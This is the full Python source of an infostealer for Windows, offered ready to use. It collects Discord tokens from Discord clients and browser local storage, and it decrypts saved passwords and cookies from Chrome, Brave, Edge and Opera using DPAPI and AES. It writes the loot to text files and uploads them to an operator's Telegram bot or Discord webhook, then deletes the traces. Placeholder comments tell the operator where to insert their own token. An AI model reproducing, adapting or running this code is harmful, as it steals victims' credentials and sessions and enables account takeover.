import win32crypt
from sqlite3 import connect
from json import loads
from base64 import b64decode
from Cryptodome.Cipher import AES
import os
from shutil import copy2
from requests import post, get
import re


local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
        
tokenPaths = {
    'Discord': roaming + '\\Discord',
    'Discord Canary': roaming + '\\discordcanary',
    'Discord PTB': roaming + '\\discordptb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'OperaGX' : roaming + '\\Opera Software\\Opera GX Stable'
}

browser_loc = {
    "Chrome" : local + "\\Google\\Chrome",
    "Brave" : local + "\\BraveSoftware\\Brave-Browser",
    "Edge" : local + "\\Microsoft\\Edge",
    "Opera" : roaming + "\\Opera Software\\Opera Stable",
    "OperaGX" : roaming + "\\Opera Software\\Opera GX Stable"
}

fileCookies = "cooks_"+ os.getlogin()+ ".txt"
filePass = "passes_"+ os.getlogin()+ ".txt"
fileInfo = "info_" + os.getlogin()+ ".txt"

#DISCORD TOKENS
def decrypt_token(buff, master_key):
    try:
        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        pass


def get_tokens(path):
    cleaned = []
    tokens = []
    done = []
    levDB = path + "\\Local Storage\\leveldb\\"
    LocState = path + "\\Local State"
    #new method with encryption
    if os.path.exists(LocState):
        with open(LocState, "r") as file:
            key = loads(file.read())['os_crypt']['encrypted_key']
            file.close()
        for file in os.listdir(levDB):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue
            else:
                try:
                    with open(levDB + file, "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError:
                    continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]
                
    else: #old method without encryption

        for file_name in os.listdir(path):
            try:
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
            

                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            done.append(token)

            except PermissionError:
                continue

    return done
#DECRYPT CIPHERS
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

#DECRYPT BROWSER
def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    

    if os.path.exists(LocalState):
        with open(LocalState) as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        if os.path.exists(LoginData):
            copy2(LoginData, "TempMan.db")
            con = connect("TempMan.db")
            cur = con.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            f = open(filePass,"a")
            f.write("***" + name + "***\n")
            f.close()
            for index,logins in enumerate(cur.fetchall()):

                try:
                    if not logins[0]:
                        continue
                    if not logins[1]:
                        continue
                    if not logins[2]:
                        continue
                    ciphers = logins[2]
                    initVector = ciphers[3:15]
                    encPass = ciphers[15:-16]

                    cipher = generate_cipher(master_key, initVector)
                    decPass = decrypt_payload(cipher, encPass).decode()
                    toprint = 'URL : {}\nName: {}\nPass: {}\n\n'.format(logins[0], logins[1], decPass)
                    f = open(filePass,"a")
                    f.write(toprint)
                    f.close()
                except:
                    pass
            

            
        else:
            f = open(fileInfo,"a")
            f.write(name + " Login Data file missing\n")
            f.close()
######################################################################
        if os.path.exists(CookiesFile):
            copy2(CookiesFile, "CookMe.db")
            conn = connect("CookMe.db")
            curr = conn.cursor()
            curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
            f = open(fileCookies,"a")
            f.write("***" + name + "***\n")
            f.close()
            for index, cookies in enumerate(curr.fetchall()):

                try:
                    if not cookies[0]:
                        continue
                    if not cookies[1]:
                        continue
                    if not cookies[2]:
                        continue
                    if "google" in cookies[0]:
                        continue
                    ciphers = cookies[2]
                    initVector = ciphers[3:15]
                    encPass = ciphers[15:-16]
                    cipher = generate_cipher(master_key, initVector)
                    decPass = decrypt_payload(cipher, encPass).decode()
                    toprint = 'URL : {}\nName: {}\nCook: {}\n\n'.format(cookies[0], cookies[1], decPass)
                    l = open(fileCookies,"a")
                    l.write(toprint)
                    l.close()
                except:
                    pass


        else:
            f = open(fileInfo,"a")
            f.write("no " + name + " Cookie file\n")
            f.close()


    else:
        f = open(fileInfo,"a")
        f.write(name + " Local State file missing\n")
        f.close()

#PATH SHIT
def Local_State(path):
    LocalState = path + "\\User Data\\Local State"
    return LocalState

def Login_Data(path):
    LoginData = path + "\\User Data\\Default\\Login Data"
    return LoginData

def Cookies(path):
    Cookies = path + "\\User Data\\Default\\Network\\Cookies"
    return Cookies


def main_tokens():
    for platform, path in tokenPaths.items():
        if not os.path.exists(path):
            continue
        try:
            tokens = get_tokens(path)
        except:
            continue
        if tokens == []:
            continue
        with open(fileInfo, "a") as f: 
            for i in tokens:
                f.write(str(i) + "\n")
            f.close()


def decrypt_files(path, browser):

    if os.path.exists(path):
        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser) 
    else:
        f = open(fileInfo,"a")
        f.write(browser + " not installed\n")
        f.close()
        



###WEBHOOK


def post_to(file):
    token = "TELEGRAM TOKEN"    #put your token in here, if you don't wanna use telegram leave it like it is
    chatid = "TELEGRAM CHATID"  #    "    chatid          "                     telegram      "      
    webhookurl = "WEBHOOK URL"  #    "    webhook         "                     discord       "      
    #if you don't understand it you shouldn't use it
    
    
    if token == "TELEGRAM TOKEN": #don't change
        pass
    else:
        if chatid == "TELEGRAM CHATID": #don't change
            pass
        else:
            post("https://api.telegram.org/bot" + token + "/sendDocument", data={'chat_id': chatid}, files={'document': open(file, 'rb')})

    if webhookurl == "WEBHOOK URL": #don't change
        pass
    else:
        post(webhookurl, files={'files': open(file,'rb')})


forHandler = (
    fileInfo,
    filePass,
    fileCookies,
    "TempMan.db",
    "CookMe.db"
)

def fileHandler(file):
    if os.path.exists(file):
        if ".txt" in file:
            post_to(file)
        os.remove(file)

def main():
    for name, path in browser_loc.items():
           decrypt_files(path, name) 
    main_tokens()
    for i in forHandler:
        fileHandler(i)
main()

###end
